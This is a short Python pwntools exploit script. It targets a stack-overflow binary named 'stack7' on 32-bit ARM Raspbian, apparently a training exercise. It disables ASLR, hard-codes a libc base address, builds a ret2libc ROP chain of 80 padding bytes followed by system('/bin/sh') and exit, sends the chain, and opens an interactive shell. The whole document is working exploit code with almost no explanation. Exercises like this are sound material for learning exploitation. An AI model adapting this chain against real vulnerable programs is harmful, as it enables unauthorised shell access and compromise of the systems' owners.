# Tested on 64bit Ubuntu, macOS
# Target : 32bit ARM, Raspberry Pi, Raspbian OS
# Python 3.7.6
# pwntools 4.2.2

# import all modules/commands from pwn library
from pwn import *
import time

# disable ASLR
# echo 0 > /proc/sys/kernel/randomize_va_space

# set the context of the target platform
#  arch: arm (32bit)
#  os: linux
context.update(arch='arm', os='linux')

libc = ELF('/lib/arm-linux-gnueabihf/libc.so.6') 
libc.address = 0x76e53000

p = process("./stack7")


rop = ROP(libc)
rop.raw("A"*80)
rop.system(next(libc.search('/bin/sh\x00')))
rop.exit(0)

payload = rop.chain()

print(rop.dump())

# Creating Payload

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

p.interactive()
